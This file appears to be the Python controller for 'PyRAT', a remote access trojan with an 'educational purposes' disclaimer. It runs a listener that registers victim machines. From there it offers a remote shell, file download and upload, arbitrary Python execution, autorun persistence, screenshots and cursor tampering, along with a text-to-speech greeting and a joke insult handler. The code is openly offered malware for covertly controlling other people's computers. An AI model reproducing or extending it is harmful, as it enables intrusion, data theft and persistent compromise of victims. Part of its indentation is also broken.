from socket import *
import threading, json, os, base64, time, pyttsx3

class ThreadedServer:
    def __init__(self):
        self.commands = """
         /$$$$$$$            /$$$$$$$              /$$    
        | $$__  $$          | $$__  $$            | $$    
        | $$  \ $$ /$$   /$$| $$  \ $$  /$$$$$$  /$$$$$$  
        | $$$$$$$/| $$  | $$| $$$$$$$/ |____  $$|_  $$_/  
        | $$____/ | $$  | $$| $$__  $$  /$$$$$$$  | $$    
        | $$      | $$  | $$| $$  \ $$ /$$__  $$  | $$ /$$
        | $$      |  $$$$$$$| $$  | $$|  $$$$$$$  |  $$$$/
        |__/       \____  $$|__/  |__/ \_______/   \___/  
                   /$$  | $$                              
                  |  $$$$$$/                              
                   \______/                               
        
        Version 3.0
        Codename: Sunrise
        Created by 0xhardcoder
        =================================================
        DISCLAIMER
        
        Usage of PyRAT Hacking Tool for attacking targets without prior mutual consent is illegal.
        It's the end user's responsibility to obey all applicable local, state and federal laws.
        Developers assume no liability and are not responsible for any misuse or damage caused by this program.
        !!! ONLY USE FOR EDUCATIONAL PURPOSES !!!

        =================================================
        Commands

        targets                      - show all connected computers
        shell [id]                   - connect to remote PC with id [id]
        download [filename]          - download [filename] from remote PC
        upload [filename]            - upload [filename] to remote PC
        cd [dirname]                 - change working directory to [dirname] on remote PC
        uninstall                    - uninstalls software from remote PC
        cursorpos                    - get cursor position on remote PC
        cursormove [X] [Y]           - set cursor position on remote PC
        touch [filename]             - creates a file with name [filename] on remote PC
        appendfile [filename] [text] - append [text] to [filename] on remote PC
        msgbox [type] [text] [title] - Starts message box with text [text] and title [title] on remote PC. Types: 0 = alert, 1 = confirm, 2 = prompt, 3 = password
        pyexec [Python expression]   - exec([Python expression]) on remote PC
        pyexecf [filename]           - Execute Python file on remote PC
        beep    [Freq] [Duration]    - Beep([Freq], [Duration]) on remote PC
        showdesktop                  - Shows desktop on remote PC 
        screenshot                   - Screenshot screen and saves it on remote PC with random name in current working directory
        private_ip                   - Shows private IP address of remote PC
        autorun                      - Adds software to autorun on remote PC
        swapmouse                    - Swaps mouse buttons on remote PC
        
        """
        self.clients = []
        self.addresses = []
        self.os = []
        self.users = []
        self.hostnames = []
        self.s = socket(AF_INET, SOCK_STREAM)
        self.s.bind(("0.0.0.0", 8080))
        self.s.listen(20)
        t1 = threading.Thread(target=self.get_clients, daemon = True)
        t1.start()
    def get_clients(self):
        while True:
            client, addr = self.s.accept()
            print("\n[+] Connection from " + addr[0])
            raw_data = self.recv(client)
            os = raw_data.split(":")[0]
            hostname = raw_data.split(":")[1]
            username = raw_data.split(":")[2]
            self.os.append(os)
            self.hostnames.append(hostname)
            self.users.append(username)
            self.clients.append(client)
            self.addresses.append(addr)

    def download(self, filename, socket):
        self.send("download " + filename, socket)
        file = self.recv(socket)
        
        if file == "error".split(" ")[0]:
            print("[-] Download failed: " + file)
        else:
            file2 = base64.b64decode(file.encode())
            if type(file2) == bytes:
                with open(filename, "wb") as f:
                    f.write(file2)
            else:
                with open(filename, "w") as f:
                    f.write(file2)
            print("[+] Download Complete Successfully")

    def upload(self, filename, socket):
        self.send("upload " + filename, socket)
        hfhh = self.recv(socket)
        try:
            with open(filename, "r") as f:
                file = f.read()
            self.send(base64.b64encode(file.encode()).decode(), socket)
        except:
            try:
                with open(filename, "rb") as f:
                    file = f.read()
                self.send(base64.b64encode(file).decode(), socket)
            except:
                print("[-] Upload Failed")
                self.send("error")
        print("[+] Upload Complete Successfully")


    def recv(self, socket):
        json_data = ""
        while True:
            try:
                json_data += socket.recv(2048).decode()
                return json.loads(json_data)
            except ValueError:
                continue
    def send(self, data, socket):
        socket.send(json.dumps(data).encode())

    
    def run(self):
        while True:
            lcmd = input(">>")
            if lcmd == "help":
                print(self.commands)
            elif lcmd.split(" ")[0] == "shell":
                try:
                    s = self.clients[int(lcmd.split(" ")[1])]
                    while True:
                        command = input("REMOTE> ")
                        if command.split(" ")[0] == "download":
                            engine.say("Download Started!")
                            self.download(command.split(" ")[1], s)
                            engine.runAndWait()
                        elif command.split(" ")[0] == "upload":
                            engine.say("Upload Started!")
                            self.upload(command.split(" ")[1], s)
                            engine.runAndWait()
                        elif command == "clear":
                            os.system("cls")
     
    
                        elif command == "exit":
                            break
                        else:
                            self.send(command, s)
                        	
                            print(self.recv(s))
                except:
					try:
                    	del self.clients[int(lcmd.split(" ")[1])]
                    except:
                        pass
                    print("Invalid shell ID")
                    continue
            elif lcmd == "targets":
                print("Connected Computers\nINDEX\tIP\t\tUSERNAME\t\tOS\t\tHOST NAME")
                for client in range(len(self.clients)):
                    print(str(client) + "\t" + self.addresses[client][0] + "\t\t" + self.users[client] + "\t\t" + self.os[client] + "\t\t" + self.hostnames[client])
                print("\n\n")
            elif lcmd == "clear":
                os.system("cls")
            elif lcmd == "лох" or lcmd == "лошара":
                for voice in voices:
                    if voice.name == 'Microsoft Irina Desktop - Russian':
                        engine.setProperty('voice', voice.id)
                engine.say("Сам ты " + lcmd)
                engine.runAndWait()
                for voice in voices:
                    if voice.name == 'Microsoft David Desktop - English (United States)':
                        engine.setProperty('voice', voice.id)
            elif lcmd == "exit":
                engine.say("Bye!")
                engine.runAndWait()
                self.s.close()
                exit(0)
            else:
                engine.say("Unknown command!")
                engine.runAndWait()
disclaimer = """DISCLAIMER! Usage of PyRAT Hacking Tool for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes."""



engine = pyttsx3.init() # object creation

voices = engine.getProperty('voices')

 # Перебрать голоса и вывести параметры каждого


for voice in voices:

    if voice.name == 'Microsoft David Desktop - English (United States)':

        engine.setProperty('voice', voice.id)

""" RATE"""
rate = engine.getProperty('rate')   # getting details of current speaking rate
engine.setProperty('rate', 125)     # setting up new voice rate
if "disclaimer" not in os.listdir():
    engine.say(disclaimer)
    print(disclaimer)
    engine.runAndWait()
    engine.say("Do u agree with disclaimer?")
    engine.runAndWait()
    ans = input("Do u agree with disclaimer?")
    if "n" in ans.lower():
        exit(0)
    with open("disclaimer", "w") as f:
        f.write("1")

os.system("cls")
engine.say("Welcome to PyRAT! Type targets to view connected computers. Type shell id to connect")
print("Welcome to PyRAT! Type 'targets' to view connected computers. Type 'shell [id]' to connect")
engine.runAndWait()
server = ThreadedServer()
server.run()
